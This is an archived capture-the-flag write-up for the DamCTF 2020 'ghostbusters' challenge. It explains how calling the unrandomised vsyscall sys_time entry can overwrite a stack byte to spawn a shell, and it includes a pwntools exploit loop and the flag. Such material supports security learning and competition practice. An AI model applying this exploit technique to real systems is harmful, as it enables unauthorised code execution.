# ghostbusters

**CTF:** DamCTF 2020  
**Category:** misc  
**Original writeup:** <https://ctftime.org/writeup/24159> — by **ctftime.org**. All credit goes to the original author; this is an archived copy.

---

The binary we were given was simply taking in input a pointer via scanf and then make an arbitrary call on it.

It then compare the last byte of a variable stored on the main function stackframe with 'n' and 'y' and then call a shell if the char is 'y'.

All protections were enabled.

![Ghidra decompiler view](https://i.ibb.co/PGFP0dN/Screenshot-from-2020-10-13-00-06-39.png)

The main difficulty of this challenge was looking for where to make an arbitrary call with PIE and ASLR enabled.

After a bit of research on the binary, when reading the mappings of the process, I noticed a special segment "vsyscall" which wasn't affected by ASLR and executable as showed below:

```

55add8fb1000-55add8fb2000 r-xp 00000000 08:02 12321756 /home/guillaume/Documents/CTF/damCTF/pwn/ghostbusters/ghostbusters

55add91b1000-55add91b2000 r--p 00000000 08:02 12321756 /home/guillaume/Documents/CTF/damCTF/pwn/ghostbusters/ghostbusters

55add91b2000-55add91b3000 rw-p 00001000 08:02 12321756 /home/guillaume/Documents/CTF/damCTF/pwn/ghostbusters/ghostbusters

55adda80d000-55adda82e000 rw-p 00000000 00:00 0 [heap]

7fb0ef929000-7fb0efb10000 r-xp 00000000 08:02 14680329 /lib/x86_64-linux-gnu/libc-2.27.so

7fb0efb10000-7fb0efd10000 ---p 001e7000 08:02 14680329 /lib/x86_64-linux-gnu/libc-2.27.so

7fb0efd10000-7fb0efd14000 r--p 001e7000 08:02 14680329 /lib/x86_64-linux-gnu/libc-2.27.so

7fb0efd14000-7fb0efd16000 rw-p 001eb000 08:02 14680329 /lib/x86_64-linux-gnu/libc-2.27.so

7fb0efd16000-7fb0efd1a000 rw-p 00000000 00:00 0

7fb0efd1a000-7fb0efd41000 r-xp 00000000 08:02 14680317 /lib/x86_64-linux-gnu/ld-2.27.so

7fb0eff15000-7fb0eff17000 rw-p 00000000 00:00 0

7fb0eff41000-7fb0eff42000 r--p 00027000 08:02 14680317 /lib/x86_64-linux-gnu/ld-2.27.so

7fb0eff42000-7fb0eff43000 rw-p 00028000 08:02 14680317 /lib/x86_64-linux-gnu/ld-2.27.so

7fb0eff43000-7fb0eff44000 rw-p 00000000 00:00 0

7ffea129d000-7ffea12be000 rw-p 00000000 00:00 0 [stack]

7ffea1383000-7ffea1386000 r--p 00000000 00:00 0 [vvar]

7ffea1386000-7ffea1388000 r-xp 00000000 00:00 0 [vdso]

ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]

```

It it used with vdso to enhance syscalls performance.

While exploring it, I could list 3 entries, that were syscalls we could call:

- 0xffffffffff600000: sys_gettimeofday

- 0xffffffffff600400: sys_time

- 0xffffffffff600800: sys_getcpu

For some reasons, I couldn't jump on the first and third entry, letting us only the possibility to call sys_time.

Before calling our pointer, we can see on the Cutter graph that the address of the variable compared to 'y' was put on rdi

![Cutter graph](https://i.ibb.co/Jt1M8Tg/Screenshot-from-2020-10-12-23-56-41.png)

And the sys_time syscall assigns the current timestamp to the value pointed by rdi.

Sooo if we manage to have the timestamp such as the LSB is "0x79" = 'y' we win !

We can write an ugly script to do this:

```

#!/usr/bin/python

from pwn import *

import time

REMOTE = True

while True:

if REMOTE:

r = remote('chals.damctf.xyz', 32556)

else:

r = process('./ghostbusters')

r.recv()

r.sendline('0xffffffffff600400')

if REMOTE:

r.recv()

try:

r.sendline('id')

print(r.recv())

r.interactive()

r.close()

except:

r.close()

time.sleep(1)

# dam{th3_Gh0s75_0F_T1m3_k3ep_H4unTiNg_m3}

```

Fun challenge, would recommend, learned about the vsyscall table.
